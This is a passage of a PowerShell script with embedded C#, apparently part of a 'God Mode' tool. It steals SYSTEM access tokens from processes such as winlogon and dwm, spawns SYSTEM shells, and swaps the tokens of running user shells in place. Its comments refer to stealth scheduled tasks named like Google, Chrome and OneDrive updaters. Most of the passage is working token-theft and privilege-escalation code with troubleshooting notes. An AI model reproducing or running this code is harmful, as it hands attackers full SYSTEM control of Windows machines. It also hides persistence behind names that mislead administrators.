                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "WinSta0\\Default";
                    if (hideWindow) {
                        si.dwFlags = 0x00000001;
                        si.wShowWindow = 0;
                    }
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    uint creationFlags = CREATE_UNICODE_ENVIRONMENT;
                    if (hideWindow) creationFlags |= CREATE_NO_WINDOW;
                    else creationFlags |= CREATE_NEW_CONSOLE;
                    if (!CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, appName, cmdLine, creationFlags, IntPtr.Zero, null, ref si, out pi)) {
                        return Marshal.GetLastWin32Error();
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return 0;
                } finally {
                    CloseHandle(hPrimaryToken);
                }
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_ACCESS_TOKEN ProcessInformation, int ProcessInformationLength);

    public const int ProcessAccessToken = 9;

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_ACCESS_TOKEN {
        public IntPtr Token;
        public IntPtr Thread;
    }

    public static bool ReplaceProcessToken(int sourcePid) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, sourcePid);
        if (hProcess == IntPtr.Zero) return false;
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) return false;
            try {
                IntPtr hPrimaryToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hPrimaryToken)) return false;
                try {
                    PROCESS_ACCESS_TOKEN pat = new PROCESS_ACCESS_TOKEN();
                    pat.Token = hPrimaryToken;
                    pat.Thread = IntPtr.Zero;
                    int status = NtSetInformationProcess(GetCurrentProcess(), ProcessAccessToken, ref pat, Marshal.SizeOf(pat));
                    return status == 0;
                } finally {
                    CloseHandle(hPrimaryToken);
                }
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    public static bool ReplaceProcessTokenForPid(int targetPid, int sourcePid) {
        // Enable SeTcbPrivilege BEFORE calling NtSetInformationProcess(
        // ProcessAccessToken). Replacing a process's primary token is a TCB
        // operation -- NtSetInformationProcess returns STATUS_PRIVILEGE_NOT_HELD
        // (0xC0000061) without it, even when running as SYSTEM (SYSTEM holds
        // SeTcbPrivilege but it is NOT enabled by default in the token). This
        // was the root cause of "In-place replacement failed for powershell" --
        // Phase 0 failed on every shell, the monitor fell through to kill+relaunch
        // (Phase 2 gmproxy service), which KILLED the user's shell and birthed a
        // new one (the user saw their console disappear). With SeTcbPrivilege
        // enabled, NtSetInformationProcess succeeds and the shell is elevated
        // IN-PLACE (no kill, no flicker, whoami -> SYSTEM). Mirrors
        // CreateProcessAsSystem which already enables SeTcbPrivilege (line 2237).
        EnablePrivilege("SeTcbPrivilege");
        // PROCESS_SET_INFORMATION (0x0200) is the documented access for
        // NtSetInformationProcess. Add PROCESS_DUP_HANDLE (0x0040) as a
        // belt-and-suspenders -- some Windows 11 builds check for it when the
        // token is being replaced across session boundaries.
        const uint PROCESS_SET_INFORMATION = 0x0200;
        const uint PROCESS_DUP_HANDLE = 0x0040;
        IntPtr hSource = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, sourcePid);
        if (hSource == IntPtr.Zero) return false;
        try {
            IntPtr hSourceToken = IntPtr.Zero;
            if (!OpenProcessToken(hSource, TOKEN_DUPLICATE | TOKEN_QUERY, out hSourceToken)) return false;
            try {
                IntPtr hPrimaryToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hSourceToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hPrimaryToken)) return false;
                try {
                    IntPtr hTarget = OpenProcess(PROCESS_SET_INFORMATION | PROCESS_DUP_HANDLE, false, targetPid);
                    if (hTarget == IntPtr.Zero) return false;
                    try {
                        PROCESS_ACCESS_TOKEN pat = new PROCESS_ACCESS_TOKEN();
                        pat.Token = hPrimaryToken;
                        pat.Thread = IntPtr.Zero;
                        int status = NtSetInformationProcess(hTarget, ProcessAccessToken, ref pat, Marshal.SizeOf(pat));
                        return status == 0;
                    } finally {
                        CloseHandle(hTarget);
                    }
                } finally {
                    CloseHandle(hPrimaryToken);
                }
            } finally {
                CloseHandle(hSourceToken);
            }
        } finally {
            CloseHandle(hSource);
        }
    }
}
"@

# --- TokenOps availability probe. Returns $true only when the [TokenOps] C#
#     P/Invoke type is resolvable in this session. Used by the hardened compile
#     below (skip-if-loaded), Assert-TokenOpsAvailable (graceful elevation
#     guard), Invoke-TokenOpsPrivilege, and the option-11 diagnostics. Fail-open:
#     any type-resolution failure (type never compiled / compile failed) -> $false.
#     Referencing an unloaded type throws "Unable to find type [TokenOps]" -- a
#     terminating error caught here (NOT left to the global trap { ... break },
#     which would terminate the scope). ---
function Test-TokenOpsAvailable {
    try {
        $null = [TokenOps]
        return $true
    } catch {
        return $false
    }
}

# --- Hardened TokenOps C# P/Invoke compile (replaces the bare Add-Type +
#     WARN-only catch that was the root cause of "shells stay admin after
#     [7]+reboot"). At boot, multiple stealth -ToggleOn tasks fire concurrently
#     (main + guardian + GoogleUpdateTask_ + ChromeUpdater_ +
#     OneDriveSyncTask_), each running Enable-GodMode -> each compiling TokenOps
#     via Add-Type at the same instant -> N concurrent in-memory C# compilations
#     exhaust memory -> OutOfMemoryException -> the old WARN-only catch swallowed
#     it and left TokenOps UNLOADED. The monitor's Invoke-ExistingProcessElevation
#     then hit an unguarded [TokenOps]::EnablePrivilege -> "Unable to find type
#     [TokenOps]" uncaught trap (the global trap { ... break } terminates the
#     scope) -> monitor died -> [NO LIVE MONITOR LOOP] -> shells never elevated
#     (whoami -> admin).
#
#     3-layer hardening: (1) skip the compile entirely if a sibling task already
#     loaded [TokenOps] (Test-TokenOpsAvailable) -- the common case once one task
#     wins the race, removing the redundant concurrent compiles that caused the
#     OOM. (2) Serialize the actual compile via a Global kernel mutex
#     (Global\GodModeTokenOpsCompile) so only one task compiles at a time;
#     double-check Test-TokenOpsAvailable under the mutex (a sibling may have
#     finished while we waited). (3) Retry up to 3x on OutOfMemoryException
#     (GC.Collect + WaitForPendingFinalizers + backoff) so a sibling's compile
#     can finish + free its in-memory assembly; break immediately on non-memory
#     errors (syntax / assembly-load -- retrying cannot help). The failure reason
#     is stored in $script:TokenOpsCompileReason for the option-11 diagnostics
#     (the "add debug if it even fails" surface). ---
$script:TokenOpsCompileReason = $null

if (-not (Test-TokenOpsAvailable)) {
    $compileMutex = $null
    $compileOwned = $false
    $compileMutexName = "Global\GodModeTokenOpsCompile"
    try {
        try {
            $compileMutex = [System.Threading.Mutex]::OpenExisting($compileMutexName)
        } catch {
            try { $compileMutex = New-Object System.Threading.Mutex($false, $compileMutexName) } catch { $compileMutex = $null }
        }
        if ($compileMutex) {
            try { $compileOwned = $compileMutex.WaitOne(15000) } catch { $compileOwned = $false }
        }
        # Double-check under the mutex: a sibling -ToggleOn task may have
        # compiled + loaded [TokenOps] while we waited for the mutex.
        if (-not (Test-TokenOpsAvailable)) {
            $maxAttempts = 3
            for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
                try {
                    Add-Type -TypeDefinition $TokenOpsType -ErrorAction Stop
                    $script:TokenOpsCompileReason = "compiled OK (attempt $attempt)"
                    Write-DebugLog -FunctionName "TokenOps-Compile" -Action "EXIT" -Message "TokenOps C# P/Invoke compiled on attempt $attempt (mutex held=$compileOwned)"
                    break
                } catch {
                    $errMsg = "$($_.Exception.Message)"
                    if ($errMsg -match 'Insufficient memory|OutOfMemory|OutOfMemoryException') {
                        # Transient: a sibling task's in-memory compile is still
                        # holding memory. Force a GC + finalizer pass + backoff so
                        # the sibling can finish + free its assembly, then retry.
                        $script:TokenOpsCompileReason = "OutOfMemoryException on attempt $attempt (concurrent Add-Type compile)"
                        if ($attempt -lt $maxAttempts) {
                            try { [System.GC]::Collect() } catch {}
                            try { [System.GC]::WaitForPendingFinalizers() } catch {}
                            Start-Sleep -Milliseconds ($attempt * 750)
                        }
                    } else {
                        # Non-memory error (C# syntax / assembly-load conflict):
                        # retrying cannot help. Record + break.
                        $script:TokenOpsCompileReason = "compile failed: $errMsg (attempt $attempt, non-memory)"
                        Write-Log -Message "TokenOps C# compile failed (non-memory): $errMsg" -Type "ERROR" -Color Red
                        Write-DebugLog -FunctionName "TokenOps-Compile" -Action "ERROR" -Message "Non-memory compile failure (attempt $attempt): $errMsg" -RootCause "C# syntax error or assembly-load conflict. Without TokenOps, SYSTEM elevation is unavailable -- shells will stay admin. Re-enable God Mode (option [7]) when no other enable task is racing."
                        break
                    }
                }
            }
            # If every attempt failed, surface the final failure loudly.
            if (-not (Test-TokenOpsAvailable)) {
                Write-Log -Message "TokenOps C# P/Invoke FAILED to compile after $maxAttempts attempt(s): $script:TokenOpsCompileReason. SYSTEM elevation (shell in-place token swap) is UNAVAILABLE -- re-enable God Mode (option [7]) when no other enable task is racing." -Type "ERROR" -Color Red
                Write-DebugLog -FunctionName "TokenOps-Compile" -Action "ERROR" -Message "All compile attempts exhausted. Reason: $script:TokenOpsCompileReason" -RootCause "Concurrent Add-Type compiles exhausted memory (multiple -ToggleOn tasks at boot), or a C# syntax/assembly-load error. Re-enable God Mode (option [7]) when no other enable task is racing to get a clean single compile."
            }
        }
    } finally {
        if ($compileOwned -and $compileMutex) { try { $compileMutex.ReleaseMutex() } catch {} }
        if ($compileMutex) { try { $compileMutex.Close() } catch {} }
    }
} else {
    $script:TokenOpsCompileReason = "already loaded (sibling task compiled it)"
    Write-DebugLog -FunctionName "TokenOps-Compile" -Action "INFO" -Message "TokenOps already available -- skipped the compile (a sibling -ToggleOn task loaded it; avoids the concurrent-compile OOM)."
}

$script:__ElevPrivWarned = $false

function Enable-ElevationPrivileges {
    $privResults = @()
    $required = @("SeDebugPrivilege", "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege")
    foreach ($privName in $required) {
        try {
            $rc = [TokenOps]::EnablePrivilege($privName)
            $privResults += [PSCustomObject]@{ Name = $privName; Result = $rc }
            if (-not $rc) {
                $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $rootCause = Get-Win32ErrorRootCause -ErrorCode $err -Context "general"
                Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "ERROR" -Message "Failed to enable $privName | Win32=$err" -RootCause $rootCause
                Write-Log -Message "Privilege fail: $privName -> $rootCause" -Type "WARN" -Color Yellow
            } else {
                Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "INFO" -Message "$privName enabled successfully"
            }
        } catch {
            Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "ERROR" -Message "Exception enabling $privName | $($_.Exception.Message)" -ErrorRecord $_
        }
    }
    $missing = ($privResults | Where-Object { -not $_.Result }).Name
    if ($missing) {
        if (-not $script:__ElevPrivWarned) {
            $script:__ElevPrivWarned = $true
            Write-Log -Message "CRITICAL: Missing required privileges: $missing. Token stealing will likely fail. Exporting diagnostics..." -Type "ERROR" -Color Red
            Export-ElevationDiagnostics -Trigger "MissingPrivileges"
        } else {
            Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "INFO" -Message "Missing privileges already warned once this session: $missing"
        }
    } else {
        Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "EXIT" -Message "All required privileges enabled. Results: $($privResults | ConvertTo-Json -Compress)"
    }
}

function Assert-TokenOpsAvailable {
    <#
    .SYNOPSIS
        Early-return guard for every elevation entry point. If the [TokenOps]
        C# P/Invoke class is NOT loaded (the hardened compile failed -- the root
        cause of "shells stay admin"), log a loud ERROR + the stored compile
        reason + the remedy, and return $false so the caller degrades gracefully
        (leaves the app/shell at its current privilege) instead of hitting an
        unguarded [TokenOps]:: call that throws "Unable to find type [TokenOps]"
        -- which (via the global trap { ... break }) previously killed the
        monitor loop. Returns $true when TokenOps is available.
    .PARAMETER Caller
        The calling function name (for the log line so the option-11 dump
        pinpoints which entry point was blocked).
    #>
    param([string]$Caller)
    if (Test-TokenOpsAvailable) { return $true }
    $reason = if ($script:TokenOpsCompileReason) { $script:TokenOpsCompileReason } else { 'not attempted this session' }
    Write-Log -Message "[$Caller] CANNOT elevate: TokenOps C# P/Invoke not loaded (compile failed: $reason). SYSTEM elevation unavailable -- re-enable God Mode (option [7]) when no other enable task is racing." -Type "ERROR" -Color Red
    Write-DebugLog -FunctionName $Caller -Action "ERROR" -Message "TokenOps not available -- elevation aborted gracefully (no uncaught trap)" -RootCause "TokenOps compile failed: $reason. The monitor survives this; the app/shell stays at its current privilege. Re-enable God Mode (option [7]) when no other enable task is racing to get a clean single compile."
    return $false
}

function Invoke-TokenOpsPrivilege {
    <#
    .SYNOPSIS
        TokenOps-safe wrapper for [TokenOps]::EnablePrivilege. Returns $false
        (no extra Assert spam -- the caller should Assert-TokenOpsAvailable
        first) if TokenOps is unavailable, instead of throwing "Unable to find
        type [TokenOps]" (which the global trap { ... break } turns into a
        monitor-killing termination). Wraps the P/Invoke in try/catch so a
        transient privilege-adjust failure never throws uncaught. Replaces the 5
        unguarded `[TokenOps]::EnablePrivilege("SeIncreaseQuotaPrivilege") |
        Out-Null` sites in the elevation path (Invoke-ExistingProcessElevation,
        Invoke-GmProxyFeedbackElevation, Monitor-ElevateProcess Phase 0/1, the
        periodic scan) -- the immediate killer when TokenOps was missing.
    .PARAMETER PrivilegeName
        e.g. "SeIncreaseQuotaPrivilege".
    #>
    param([string]$PrivilegeName)
    if (-not (Test-TokenOpsAvailable)) { return $false }
    try {
        return [bool][TokenOps]::EnablePrivilege($PrivilegeName)
    } catch {
        Write-DebugLog -FunctionName "Invoke-TokenOpsPrivilege" -Action "WARN" -Message "EnablePrivilege($PrivilegeName) threw: $($_.Exception.Message)"
        return $false
    }
}

function Find-SystemProcessCandidate {
    param([int]$MaxScan = 30)

    # Cache hit: valid for 60 seconds and process still alive
    if ($script:CachedSystemPid -gt 0 -and ((Get-Date) - $script:CachedSystemPidTimestamp) -lt [TimeSpan]::FromSeconds(60)) {
        try {
            $proc = Get-Process -Id $script:CachedSystemPid -ErrorAction SilentlyContinue
            if ($proc) { return $script:CachedSystemPid }
        } catch {}
    }

    $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    if (-not $allProcs) {
        Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "ERROR" -Message "Get-CimInstance Win32_Process returned nothing. WMI may be broken or restricted."
        return 0
    }

    $diagnostics = @()
    $diagnostics += "Scan started. Total processes: $($allProcs.Count)"

    # Resolve the active interactive console session so we only steal a SYSTEM
    # token that already lives in THAT session. A token sourced from Session 0
    # (services.exe / svchost -- Session-0 SYSTEM) births the child ownerless in
    # Session 0 -> empty User column, no visible window. A token from a different
    # interactive session (RDP) births the child on the wrong desktop. Falls back
    # to 1 (the typical interactive session) if WTSGetActiveConsoleSessionId is
    # unavailable or no console session is attached (returns 0xFFFFFFFF).
    $activeSession = 1
    try {
        $rawSid = [TokenOps]::WTSGetActiveConsoleSessionId()
        if ($rawSid -ne [uint32]0xFFFFFFFF) { $activeSession = [int]$rawSid }
    } catch {
        $diagnostics += "WTSGetActiveConsoleSessionId unavailable; defaulting activeSession=1"
    }

    $priorityNames = @("winlogon.exe","dwm.exe","fontdrvhost.exe")
    foreach ($name in $priorityNames) {
        $candidates = $allProcs | Where-Object { $_.Name -eq $name -and $_.SessionId -eq $activeSession }
        foreach ($proc in $candidates) {
            try {
                $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                if ($owner -eq "SYSTEM") {
                    $test = [TokenOps]::TestOpenProcess($proc.ProcessId)
                    if ($test) {
                        $diagnostics += "SUCCESS: Selected Session $activeSession SYSTEM process: $($proc.Name) PID=$($proc.ProcessId)"
                        Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
                        $script:CachedSystemPid = $proc.ProcessId
                        $script:CachedSystemPidTimestamp = Get-Date
                        return $proc.ProcessId
                    } else {
                        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        $rc = Get-Win32ErrorRootCause -ErrorCode $err -Context "OpenProcess"
                        $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$activeSession Owner=SYSTEM | TestOpenProcess failed | $rc"
                    }
                } else {
                    $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$activeSession Owner=$owner (not SYSTEM)"
                }
            } catch {
                $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$activeSession | WMI GetOwner exception: $($_.Exception.Message)"
            }
        }
    }

    # Fallback: any SYSTEM process in an INTERACTIVE session (Session > 0) only.
    # services.exe is explicitly excluded -- it is SYSTEM but runs in Session 0,
    # and a Session-0 token births the child ownerless (empty User column, no
    # visible window). Same for smss/csrss/wininit/lsass (Session 0 OS core).
    $excludeNames = @("System","Registry","smss.exe","csrss.exe","wininit.exe","lsass.exe","services.exe","MsMpEng.exe")
    $scanned = 0
    foreach ($proc in ($allProcs | Where-Object { $_.ProcessId -gt 4 -and $_.SessionId -gt 0 -and $_.Name -notin $excludeNames } | Sort-Object { $_.SessionId } -Descending)) {
        if ($scanned -ge $MaxScan) { break }
        $scanned++
        try {
            $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
            if ($owner -eq "SYSTEM") {
                $test = [TokenOps]::TestOpenProcess($proc.ProcessId)
                if ($test) {
                    $diagnostics += "SUCCESS: Selected fallback SYSTEM process: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId)"
                    Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
                    $script:CachedSystemPid = $proc.ProcessId
                    $script:CachedSystemPidTimestamp = Get-Date
                    return $proc.ProcessId
                } else {
                    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    $rc = Get-Win32ErrorRootCause -ErrorCode $err -Context "OpenProcess"
                    $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId) Owner=SYSTEM | TestOpenProcess failed | $rc"
                }
            } else {
                $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId) Owner=$owner (not SYSTEM)"
            }
        } catch {
            $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) | WMI GetOwner exception: $($_.Exception.Message)"
        }
    }
    Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "ERROR" -Message "No usable SYSTEM process found after $scanned scans. Details: $($diagnostics -join ' | ')" -RootCause "All SYSTEM candidates rejected due to PPL protection, missing privileges, or session mismatch (Session 0 excluded -- a Session-0 token would birth the child ownerless). Check Export-ElevationDiagnostics dump."
    Export-ElevationDiagnostics -Trigger "NoSystemProcessCandidate"
    return 0
}

function Start-ProcessWithStolenToken {
    param(
        [string]$Path,
        [string]$Arguments = "",
        [switch]$HideWindow
    )
    if (-not (Assert-TokenOpsAvailable -Caller 'Start-ProcessWithStolenToken')) { return $false }
    try {
        Enable-ElevationPrivileges
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -eq 0) {
            $rootCause = "No accessible SYSTEM process found. Either all SYSTEM processes are PPL-protected, current token lacks SeDebugPrivilege, or no SYSTEM processes are running."
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Find-SystemProcessCandidate returned 0" -RootCause $rootCause
            return $false
        }
        $cmd = "`"$Path`""
        if ($Arguments) { $cmd += " $Arguments" }
        Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "INFO" -Message "Attempting token steal from PID=$systemPid for target=$Path"
        $result = [TokenOps]::CreateProcessFromToken($systemPid, $Path, $cmd, [bool]$HideWindow)
        if ($result -eq 0) {
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "EXIT" -Message "Success PID=$systemPid spawned=$Path"
            return $true
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessWithTokenW"
            $rootCause = "Win32 error $result during CreateProcessWithTokenW. $errMsg"
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Failed to spawn $Path from PID=$systemPid | Error=$result" -RootCause $rootCause
            Write-Log -Message "Token-steal failed: $errMsg (PID=$systemPid)" -Type "WARN" -Color Yellow
            if ($result -eq 5 -or $result -eq 87 -or $result -eq 1307) {
                $ctx = Get-ProcessElevationContext -ProcessId $systemPid
                Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "INFO" -Message "Source process context: Session=$($ctx.SessionId), Name=$($ctx.Name), CanDup=$($ctx.CanDuplicate). If Session=0, GUI apps will be invisible. Session 1 SYSTEM processes are required for visible desktop apps."
            }
            return $false
        }
    } catch {
        Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Unhandled exception: $($_.Exception.Message)" -ErrorRecord $_
        return $false
    }
}

function Start-SystemShell {
    # On-demand interactive SYSTEM shell launcher (CLI -LaunchShellAsSystem +
    # menu [19]). Mirrors the -LaunchTaskMgrAsSystem path: steals a Session>0
    # SYSTEM token via CreateProcessWithTokenW ([TokenOps]::CreateProcessFromToken)
    # -- which only requires SeImpersonatePrivilege (held by an interactive
    # Administrator), NOT SeAssignPrimaryTokenPrivilege -- and births the shell
    # in the active console session so it is visible + interactive (whoami ->
    # nt authority\system). The monitor's WMI watcher / 5s polling will see the
    # new shell, but Monitor-ElevateProcess's Test-PidIsSystem guard skips the
    # redundant SYSTEM->SYSTEM in-place swap. Fail-open: on any SYSTEM-token
    # failure, fall back to a normal (non-SYSTEM) launch so the user still gets
    # a shell.
    param([string]$ShellName = "powershell")
    Write-DebugLog -FunctionName "Start-SystemShell" -Action "ENTRY" -Message "ShellName=$ShellName"
    # Normalize + validate the shell name (default powershell on any unknown value).
    $validShells = @("cmd","powershell","pwsh","ise")
    $shellKey = "$ShellName".Trim().ToLower()
    if ($validShells -notcontains $shellKey) {
        Write-Log -Message "Start-SystemShell: unknown shell '$ShellName'; defaulting to powershell." -Type "WARN" -Color Yellow
        $shellKey = "powershell"
    }
    # Resolve the shell executable path.
    $shellExe = ""
    switch ($shellKey) {
        "cmd"        { $shellExe = Join-Path $env:WINDIR "System32\cmd.exe" }
        "powershell" { $shellExe = Join-Path $env:WINDIR "System32\WindowsPowerShell\v1.0\powershell.exe" }
        "ise"        { $shellExe = Join-Path $env:WINDIR "System32\WindowsPowerShell\v1.0\powershell_ise.exe" }
        "pwsh" {
            $shellExe = Join-Path $env:ProgramFiles "PowerShell\7\pwsh.exe"
            if (-not (Test-Path $shellExe)) {
                $alt = "C:\Program Files\PowerShell\7\pwsh.exe"
                if (Test-Path $alt) { $shellExe = $alt }
            }
        }
    }
    if (-not $shellExe -or -not (Test-Path $shellExe)) {
        Write-Log -Message "Start-SystemShell: shell executable not found for '$shellKey' ($shellExe)." -Type "ERROR" -Color Red
        Write-Host "[ERROR] Shell executable not found: $shellExe" -ForegroundColor Red
        return $false
    }
    # God Mode inactive warning (suggestion): the on-demand SYSTEM shell is most
    # useful with God Mode ON -- the monitor's Session>0 SYSTEM shells are the
    # token source Find-SystemProcessCandidate steals from. With God Mode off
    # there may be no Session>0 SYSTEM process, so the launch falls back to a
    # normal (non-SYSTEM) shell. Best-effort either way; this just sets expectations.
    if (-not (Test-GodModeActive)) {
        Write-Host "[INFO] God Mode is INACTIVE -- launching with best effort (falls back to a normal shell if no Session>0 SYSTEM token is available)." -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Start-SystemShell" -Action "INFO" -Message "GodMode flag not set; on-demand SYSTEM shell may fall back to a normal launch"
    }
    Enable-ElevationPrivileges
    # CreateProcessWithTokenW is serviced by seclogon; ensure it is running so the
    # SYSTEM launch does not silently fall back to an unelevated start (mirrors
    # -LaunchTaskMgrAsSystem). Best-effort.
    try {
        $seclogon = Get-Service -Name seclogon -ErrorAction SilentlyContinue
        if ($seclogon) {
            if ($seclogon.StartType -eq 'Disabled') {
                Set-Service -Name seclogon -StartupType Manual -ErrorAction SilentlyContinue
                Write-DebugLog -FunctionName "Start-SystemShell" -Action "INFO" -Message "seclogon was Disabled; set to Manual"
            }
            if ($seclogon.Status -ne 'Running') {
                Start-Service -Name seclogon -ErrorAction SilentlyContinue
                Write-DebugLog -FunctionName "Start-SystemShell" -Action "INFO" -Message "seclogon start attempted"
            }
        }
    } catch {
        Write-DebugLog -FunctionName "Start-SystemShell" -Action "WARN" -Message "seclogon ensure failed: $($_.Exception.Message)"
    }
    $systemPid = Find-SystemProcessCandidate
    if ($systemPid -ne 0) {
        # Visible ($false) -- this is an INTERACTIVE shell the user wants to see.
        # Snapshot the shell exe's existing PIDs BEFORE launch so we can identify
        # the NEW child (CreateProcessFromToken returns 0 on success but discards
        # the child PID) and verify it actually came up as SYSTEM.
        $shellBaseName = [System.IO.Path]::GetFileName($shellExe)
        $beforePids = @()
        try {
            $beforePids = @(Get-CimInstance Win32_Process -Filter "Name='$shellBaseName'" -ErrorAction SilentlyContinue | ForEach-Object { $_.ProcessId })
        } catch {}
        $result = [TokenOps]::CreateProcessFromToken($systemPid, $shellExe, $shellExe, $false)
        if ($result -eq 0) {
            # Post-launch SYSTEM owner verification (suggestion): a seclogon race
            # or token filter can silently de-elevate the birth even though
            # CreateProcessWithTokenW returned success. Find the new PID (not in
            # the before-snapshot) and confirm SYSTEM; warn if it is not so the
            # user knows to run 'whoami' to confirm.
            Start-Sleep -Milliseconds 800
            $verifiedSystem = $false
            $newShellPid = 0
            try {
                $afterProcs = Get-CimInstance Win32_Process -Filter "Name='$shellBaseName'" -ErrorAction SilentlyContinue
                $newProc = $afterProcs | Where-Object { $beforePids -notcontains $_.ProcessId } | Select-Object -First 1
                if ($newProc -and $newProc.ProcessId -gt 0) {
                    $newShellPid = [int]$newProc.ProcessId
                    if (Test-PidIsSystem -ProcessId $newShellPid) { $verifiedSystem = $true }
                }
            } catch {}
            if ($verifiedSystem) {
                Write-Log -Message "$shellKey shell launched as SYSTEM (token source PID=$systemPid, child PID=$newShellPid, verified SYSTEM): $shellExe" -Type "INFO" -Color Green
                Write-Host "[SUCCESS] $shellKey launched as SYSTEM (verified). Run 'whoami' in it -> nt authority$system." -ForegroundColor Green
                Write-DebugLog -FunctionName "Start-SystemShell" -Action "EXIT" -Message "Success $shellKey PID-source=$systemPid child=$newShellPid verifiedSystem=$true"
                return $true
            } else {
                Write-Log -Message "$shellKey shell launched (CreateProcessFromToken=0) but could NOT verify SYSTEM (child PID=$newShellPid); a seclogon/token-filter race may have de-elevated it. Run 'whoami' to confirm." -Type "WARN" -Color Yellow
                Write-Host "[WARN] $shellKey launched, but could NOT verify it is SYSTEM (child PID=$newShellPid). Run 'whoami' in the new shell to confirm (a seclogon/token-filter race may have de-elevated it)." -ForegroundColor Yellow
                Write-DebugLog -FunctionName "Start-SystemShell" -Action "WARN" -Message "Launch success but verify failed $shellKey PID-source=$systemPid child=$newShellPid"
                return $true
            }
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessWithTokenW"
            Write-Log -Message "$shellKey SYSTEM launch failed (error $($result): $($errMsg)). Falling back to normal launch." -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Start-SystemShell" -Action "WARN" -Message "CreateProcessFromToken error=$result | $errMsg"
        }
    } else {
        Write-Log -Message "Start-SystemShell: no SYSTEM token available (Find-SystemProcessCandidate=0); falling back to normal launch." -Type "WARN" -Color Yellow
    }
    # Fallback: normal (non-SYSTEM) launch so the user still gets a shell.
    try {
        Start-Process $shellExe
        Write-Host "[WARN] Fell back to a normal (non-SYSTEM) $shellKey launch." -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Start-SystemShell" -Action "EXIT" -Message "Fallback normal launch for $shellKey"
        return $false
    } catch {
        Write-Log -Message "Start-SystemShell: fallback Start-Process failed: $_" -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Start-SystemShell" -Action "ERROR" -Message "Fallback Start-Process exception: $($_.Exception.Message)"
        return $false
    }
}

$script:__SystemImpersonationToken = [IntPtr]::Zero
$script:__SystemImpersonationActive = $false

function Enable-SystemImpersonation {
    try {
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -eq 0) {
            Write-Host "[ERROR] No accessible SYSTEM process found for token theft." -ForegroundColor Red
            return $false
        }
        $hProcess = [TokenOps]::OpenProcess([TokenOps]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $systemPid)
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[ERROR] Failed to open SYSTEM process PID=$systemPid." -ForegroundColor Red
            return $false
        }
        try {
            $hToken = [IntPtr]::Zero
            if (-not [TokenOps]::OpenProcessToken($hProcess, [TokenOps]::TOKEN_DUPLICATE -bor [TokenOps]::TOKEN_QUERY, [ref]$hToken)) {
                Write-Host "[ERROR] Failed to open process token for PID=$systemPid." -ForegroundColor Red
                return $false
            }
            try {
                $hImpToken = [IntPtr]::Zero
                if (-not [TokenOps]::DuplicateTokenEx($hToken, [TokenOps]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOps]::SecurityImpersonation, [TokenOps]::TokenImpersonation, [ref]$hImpToken)) {
                    Write-Host "[ERROR] Failed to duplicate token for impersonation." -ForegroundColor Red
                    return $false
                }
